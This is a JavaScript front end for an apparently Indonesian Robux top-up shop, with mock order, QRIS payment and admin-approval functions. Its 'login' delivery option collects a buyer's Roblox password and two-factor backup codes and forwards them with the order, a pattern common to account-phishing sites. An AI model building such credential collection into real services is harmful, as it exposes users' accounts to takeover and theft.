'use strict';
/* ============ MOCK API (swap each body for fetch() to your Node/Go backend) ============ */
const wait = ms => new Promise(r => setTimeout(r, ms));
let _pendingApproval = null; // mock "server" state

const api = {
  // POST /orders
  async createOrder(payload) {
    await wait(700);
    const id = 'RBX-' + Math.random().toString(36).slice(2, 8).toUpperCase();
    return { id, status: 'AWAITING_PAYMENT', ...payload };
  },
  // GET /orders/:id/payment  -> dynamic QRIS payload
  async getPayment(order) {
    await wait(400);
    return { qrisString: `00020101021226QRIS.${order.id}.${order.price}`, expiresIn: 900 };
  },
  // POST /orders/:id/paid  (in production this is a payment-gateway webhook)
  async confirmPayment(order) {
    await wait(600);
    return { ...order, status: 'PROCESSING' };
  },
  // Resolves when admin approves. Replace with polling / WebSocket / SSE on GET /orders/:id
  waitForFulfillment(order) {
    return new Promise(resolve => { _pendingApproval = () => resolve({ ...order, status: 'DELIVERED' }); });
  },
  // POST /admin/orders/:id/approve
  async approveOrder() {
    await wait(500);
    if (_pendingApproval) { _pendingApproval(); _pendingApproval = null; }
  },
};

/* ============ DATA ============ */
const PACKS = [
  { robux: 100,  price: 15000 },
  { robux: 400,  price: 55000 },
  { robux: 500,  price: 68000, flag: 'Populer' },
  { robux: 1000, price: 130000 },
  { robux: 2000, price: 255000 },
  { robux: 5000, price: 625000, flag: 'Hemat' },
];
const METHODS = { username: 'Username', gamepass: 'Gamepass', login: 'Login' };

const LEADERBOARD_DATA = [
  { name: 'PlayerOne', robux: 50000 },
  { name: 'GamerPro99', robux: 42000 },
  { name: 'RobloxKing', robux: 38500 },
  { name: 'BloxMaster', robux: 31000 },
  { name: 'TopPlayer2024', robux: 27500 },
];

const rp = n => 'Rp ' + n.toLocaleString('id-ID');
const $ = (s, r = document) => r.querySelector(s);
const $$ = (s, r = document) => [...r.querySelectorAll(s)];

/* ============ STATE ============ */
const state = { view: 'checkout', method: 'username', pack: null, order: null, timerId: null };

function go(view) {
  state.view = view;
  $$('.view').forEach(v => v.classList.toggle('is-active', v.id === 'view-' + view));
  window.scrollTo({ top: 0, behavior: 'smooth' });
}
function toast(msg) {
  const t = $('#toast'); t.textContent = msg; t.classList.add('show');
  clearTimeout(toast.id); toast.id = setTimeout(() => t.classList.remove('show'), 2400);
}

/* ============ LEADERBOARD ============ */
function renderLeaderboard() {
  const container = $('#leaderboard-list');
  container.innerHTML = LEADERBOARD_DATA.map((player, i) => `
    <div class="leaderboard-item">
      <div class="leaderboard-rank">${i + 1}</div>
      <div class="leaderboard-info">
        <div class="leaderboard-name">${player.name}</div>
        <div class="leaderboard-amount">${player.robux.toLocaleString('id-ID')} R$</div>
      </div>
    </div>
  `).join('');
}

/* ============ GUIDE MODAL ============ */
const modal = $('#guide-modal');
$('#guide-btn').addEventListener('click', () => {
  modal.classList.add('is-open');
  modal.setAttribute('aria-hidden', 'false');
  document.body.style.overflow = 'hidden';
});

function closeModal() {
  modal.classList.remove('is-open');
  modal.setAttribute('aria-hidden', 'true');
  document.body.style.overflow = '';
}

$('#modal-close').addEventListener('click', closeModal);
modal.addEventListener('click', e => {
  if (e.target === modal) closeModal();
});

document.addEventListener('keydown', e => {
  if (e.key === 'Escape' && modal.classList.contains('is-open')) closeModal();
});

/* ============ STATE 1: CHECKOUT ============ */
$('#packs').innerHTML = PACKS.map((p, i) => `
  <button type="button" class="pack" data-i="${i}" aria-pressed="false">
    ${p.flag ? `<span class="flag">${p.flag}</span>` : ''}
    <b>${p.robux.toLocaleString('id-ID')}</b><small>Robux</small>
    <span class="price">${rp(p.price)}</span>
  </button>`).join('');

$('#packs').addEventListener('click', e => {
  const btn = e.target.closest('.pack'); if (!btn) return;
  state.pack = PACKS[btn.dataset.i];
  $$('.pack').forEach(b => { const on = b === btn; b.classList.toggle('is-picked', on); b.setAttribute('aria-pressed', on); });
  renderSummary(); hideError();
});

$$('.tab').forEach(tab => tab.addEventListener('click', () => {
  state.method = tab.dataset.method;
  $$('.tab').forEach(t => { const on = t === tab; t.classList.toggle('is-active', on); t.setAttribute('aria-selected', on); });
  $$('.fields').forEach(f => f.hidden = f.dataset.for !== state.method);
  renderSummary(); hideError();
}));

function renderSummary() {
  $('#s-method').textContent = METHODS[state.method];
  $('#s-pack').textContent = state.pack ? state.pack.robux.toLocaleString('id-ID') + ' R$' : 'Belum dipilih';
  $('#s-total').textContent = rp(state.pack ? state.pack.price : 0);
}
const showError = m => { const e = $('#form-error'); e.textContent = m; e.hidden = false; };
const hideError = () => { $('#form-error').hidden = true; $$('.invalid').forEach(i => i.classList.remove('invalid')); };

function collect() {
  const f = $('#order-form'), v = n => f.elements[n].value.trim();
  const rules = {
    username: [['username', 'Isi username Roblox kamu.']],
    gamepass: [['gp_username', 'Isi username Roblox kamu.'], ['gp_url', 'Isi link gamepass.']],
    login: [['l_username', 'Isi username Roblox kamu.'], ['l_password', 'Isi password.'], ['l_codes', 'Isi minimal satu backup code.']],
  }[state.method];
  for (const [name, msg] of rules) {
    if (!v(name)) { f.elements[name].classList.add('invalid'); f.elements[name].focus(); return { error: msg }; }
  }
  if (state.method === 'gamepass' && !/^https?:\/\/(www\.)?roblox\.com\/game-pass\//i.test(v('gp_url'))) {
    f.elements.gp_url.classList.add('invalid'); return { error: 'Link gamepass harus berformat roblox.com/game-pass/...' };
  }
  if (!state.pack) return { error: 'Pilih paket Robux dulu.' };
  const data = state.method === 'username' ? { username: v('username') }
    : state.method === 'gamepass' ? { username: v('gp_username'), gamepassUrl: v('gp_url') }
    : { username: v('l_username'), password: v('l_password'), backupCodes: v('l_codes') };
  return { data };
}

$('#order-form').addEventListener('submit', async e => {
  e.preventDefault(); hideError();
  const { data, error } = collect();
  if (error) return showError(error);
  const btn = $('#order-btn'); btn.disabled = true; btn.textContent = 'Membuat pesanan...';
  try {
    state.order = await api.createOrder({ method: state.method, robux: state.pack.robux, price: state.pack.price, ...data });
    const pay = await api.getPayment(state.order);
    showPayment(pay);
  } catch { showError('Gagal membuat pesanan. Coba lagi.'); }
  finally { btn.disabled = false; btn.textContent = 'Order Now'; }
});

/* ============ STATE 2: PAYMENT ============ */
function showPayment(pay) {
  const o = state.order;
  $('#p-id').textContent = o.id; $('#p-total').textContent = rp(o.price);
  $('#qr').innerHTML = qrSvg(pay.qrisString);
  startTimer(pay.expiresIn); go('payment');
}
function startTimer(sec) {
  clearInterval(state.timerId);
  const tick = () => {
    $('#timer').textContent = `${String(Math.floor(sec / 60)).padStart(2, '0')}:${String(sec % 60).padStart(2, '0')}`;
    if (sec-- <= 0) { clearInterval(state.timerId); toast('Pembayaran kedaluwarsa'); reset(); }
  };
  tick(); state.timerId = setInterval(tick, 1000);
}
// Decorative placeholder QR (not scannable): seeded pattern + 3 finder squares
function qrSvg(seed, n = 25) {
  let h = 2166136261; for (const c of seed) h = Math.imul(h ^ c.charCodeAt(0), 16777619);
  const rnd = () => (h = Math.imul(h ^ (h >>> 15), 2246822507) >>> 0) / 4294967296;
  const inFinder = (x, y) => [[0, 0], [n - 7, 0], [0, n - 7]].some(([a, b]) => x >= a - 1 && x <= a + 7 && y >= b - 1 && y <= b + 7);
  let r = '';
  for (let y = 0; y < n; y++) for (let x = 0; x < n; x++) if (!inFinder(x, y) && rnd() > .52) r += `<rect x="${x}" y="${y}" width="1" height="1"/>`;
  const finder = (x, y) => `<rect x="${x + .5}" y="${y + .5}" width="6" height="6" fill="none" stroke="#17365C" stroke-width="1"/><rect x="${x + 2}" y="${y + 2}" width="3" height="3" fill="#2E8FE0"/>`;
  return `<svg viewBox="0 0 ${n} ${n}" fill="#17365C">${r}${finder(0, 0)}${finder(n - 7, 0)}${finder(0, n - 7)}</svg>`;
}

$('#cancel-btn').onclick = () => reset();

/* ============ STATE 3: PROCESSING ============ */
$('#paid-btn').addEventListener('click', async e => {
  e.target.disabled = true; clearInterval(state.timerId);
  state.order = await api.confirmPayment(state.order);
  go('processing'); notifyAdmin(state.order);
  const done = await api.waitForFulfillment(state.order);   // STATE 4 fires when admin approves
  showSuccess(done);
  e.target.disabled = false;
});

/* ============ STATE 4: SUCCESS ============ */
function showSuccess(o) {
  $('#done-text').textContent = `${o.robux.toLocaleString('id-ID')} Robux sudah dikirim ke ${o.username}. Order ${o.id}.`;
  go('success'); clearAdmin();
}
$('#again-btn').onclick = reset;
function reset() {
  clearInterval(state.timerId); _pendingApproval = null; clearAdmin();
  state.order = null; state.pack = null;
  $('#order-form').reset(); $$('.pack').forEach(b => b.classList.remove('is-picked'));
  renderSummary(); go('checkout');
}

/* ============ ADMIN DEBUG PANEL ============ */
function notifyAdmin(o) {
  $('#admin-empty').hidden = true; $('#admin-note').hidden = false; $('#admin-badge').hidden = false;
  $('#admin-detail').textContent = `${o.id} · ${o.robux.toLocaleString('id-ID')} R$ → ${o.username} (${METHODS[o.method]})`;
  $('#admin').classList.remove('is-closed'); $('#admin-toggle').setAttribute('aria-expanded', 'true');
}
function clearAdmin() {
  $('#admin-empty').hidden = false; $('#admin-note').hidden = true; $('#admin-badge').hidden = true;
}
$('#approve-btn').addEventListener('click', async e => {
  e.target.disabled = true; await api.approveOrder(); e.target.disabled = false;
});
$('#admin-toggle').addEventListener('click', () => {
  const closed = $('#admin').classList.toggle('is-closed');
  $('#admin-toggle').setAttribute('aria-expanded', !closed);
});

/* ============ INITIALIZATION ============ */
renderSummary();
renderLeaderboard();
